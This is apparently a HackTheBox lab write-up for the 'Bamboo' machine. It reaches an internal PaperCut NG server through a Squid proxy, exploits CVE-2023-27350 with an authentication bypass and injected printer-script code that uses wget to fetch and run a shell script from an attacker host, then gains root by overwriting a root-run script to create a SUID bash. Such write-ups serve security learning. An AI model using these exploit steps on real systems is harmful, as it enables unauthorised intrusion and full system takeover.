---
date: '2026-01-11T22:44:08+02:00'
title: 'Bamboo'
categories: [Writeup, HackTheBox]
tags: [linux, pycache]
---

## Initial Access

Initial nmap scan shows only 2 ports opened: `22` and `3128`

```console
# Nmap 7.94SVN scan initiated Sun Jan 11 14:46:41 2026 as: nmap -sCV -vv -oN nmap 10.129.38.43
Nmap scan report for 10.129.38.43
Host is up, received echo-reply ttl 63 (0.0073s latency).
Scanned at 2026-01-11 14:46:41 CST for 46s
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 83:b2:62:7d:9c:9c:1d:1c:43:8c:e3:e3:6a:49:f0:a7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNFkb6yTxAlHWItWKTH0zoiRLRbzLIEogJD96G6UiyYjmaz3cxr3IVyGJrMyNShLOUd4AOeZ1VM/P7fYMV7msZo=
|   256 cf:48:f5:f0:a6:c1:f5:cb:f8:65:18:95:43:b4:e7:e4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEOrtX+NoAgJeT57Th1zNEcj9kSDYd0TONbchFcpZcoC
3128/tcp open  http-proxy syn-ack ttl 63 Squid http proxy 5.9
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/5.9
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 11 14:47:27 2026 -- 1 IP address (1 host up) scanned in 46.94 seconds
```

Nmap tells that squid proxy is hosted on port `3128`. Using `ffuf` it's possible to scan internal network and find more running services:
```console
seq 1 65535 > ports.txt

ffuf -x http://10.129.38.43:3128 -u http://10.129.38.43:FUZZ -w ports.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.38.43:FUZZ
 :: Wordlist         : FUZZ: /home/oneeyk/box/ports.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Proxy            : http://10.129.38.43:3128
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

22                      [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 58ms]
9195                    [Status: 200, Size: 7, Words: 1, Lines: 1, Duration: 19ms]
9191                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 41ms]
9192                    [Status: 200, Size: 7, Words: 1, Lines: 1, Duration: 43ms]
34162                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 14ms]
56676                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 18ms]
60440                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 21ms]
:: Progress: [65535/65535] :: Job [1/1] :: 31 req/sec :: Duration: [0:00:45] :: Errors: 0 ::
```

The one which is interesting is `9191`, which hosts `PaperCut NG`. We can use squid proxy inside burpsuite and get access to it.
![Burp config](/assets/img/2026-01-11-22-56-07.png)

PaperCut NG
![PaperCut NG](/assets/img/2026-01-11-22-56-38.png)

PaperCut version 22.0 is vulnerable to `CVE-2023-27350`. Automated scripts are boring so we will exploit it manually.

There are multiple steps to this exploit:

- Firstly we need to bypass authentication by going to the following endpoint - `/app?service=page/SetupCompleted`
- In the Config Editor change the value of `print.script.sandboxed` to `N` and value of `print-and-device.script.enabled` to `Y`.
- Go to the scripting page of a printer and upload & execute a reverse shell

Now lets run it. Authentication bypass:
![Auth bypass](/assets/img/2026-01-11-23-04-56.png)

Go to the `Options` -> `Config Editor`

Update `print.script.sandboxed` value to `N`
![Update print.script.sandboxed value ](/assets/img/2026-01-11-23-20-38.png)

Update `print-and-device.script.enabled` to `Y`
![Update print-and-device.script.enabled value](/assets/img/2026-01-11-23-21-26.png)

Now we need to go to `Printers` -> `Scripting`

Via advanced printing scripting upload a web shell:
```console
function printJobHook(inputs, actions) {
}

java.lang.Runtime.getRuntime().exec("wget -O /tmp/s.sh http://10.10.14.202:8000/shell.sh");
```

And run it with started nc listener
```console
function printJobHook(inputs, actions) {
}

java.lang.Runtime.getRuntime().exec("/bin/bash /tmp/s.sh");
```

After running it we get a shell
![shell on the box](/assets/img/2026-01-11-23-34-55.png)

## Privilege Escalation

Privilege escalation is interesting and quite hard to find. There are 2 ways - 1 is a kernel exploit (boring) and second one requires looking for a script, which is ran by root, but is modifiable by papercut user. To do so we need to upload `pspy64` executable and start playing around with the PaperCut application. 

If we go to `Enable printing` -> `Import BYOD-friendly print queues` -> `Next` -> `Start Importing Mobility Print printers`

pspy shows that `server-command` script is ran by root
![pspy64 output](/assets/img/2026-01-11-23-43-28.png)

If we look at it more closely - we can see that `papercut` user owns it so we can easily modify it and get root.
```console
ls -la /home/papercut/server/bin/linux-x64/server-command
-rwxr-xr-x 1 papercut papercut 493 Sep 29  2022 /home/papercut/server/bin/linux-x64/server-command
```

Add the malicious payload to the `server-command` to make bash with SUID bit.
```console
papercut@bamboo:~/server/bin/linux-x64$ echo "cp /bin/bash /tmp/fakebash && chmod u+s /tmp/fakebash" > server-command
papercut@bamboo:~/server/bin/linux-x64$ chmod +x server-command
```

Now after pressing `Refresh servers` button in the PaperCut application, we trigger the execution again and get root!
![Papercut trigger](/assets/img/2026-01-11-23-49-57.png)

```console
papercut@bamboo:~/server/bin/linux-x64$ ls -la /tmp
total 4456
drwxrwxrwt 14 root     root        4096 Jan 11 21:50 .
drwxr-xr-x 19 root     root        4096 Sep 30 16:30 ..
-rwsr-xr-x  1 root     root     1396520 Jan 11 21:50 fakebash
-rwxr-xr-x  1 papercut papercut 3104768 Jan 17  2023 pspy64
-rw-r--r--  1 papercut papercut      43 Jan 11 21:24 s.sh
```

Here is our fakebash with SUID.

Now all that left is
```console
/tmp/fakebash -p
```
```console
papercut@bamboo:~/server/bin/linux-x64$ /tmp/fakebash -p
fakebash-5.1# id
uid=1001(papercut) gid=1001(papercut) euid=0(root) groups=1001(papercut)
fakebash-5.1# cat /root/root.txt
30cfa476a64309b5f9********
```
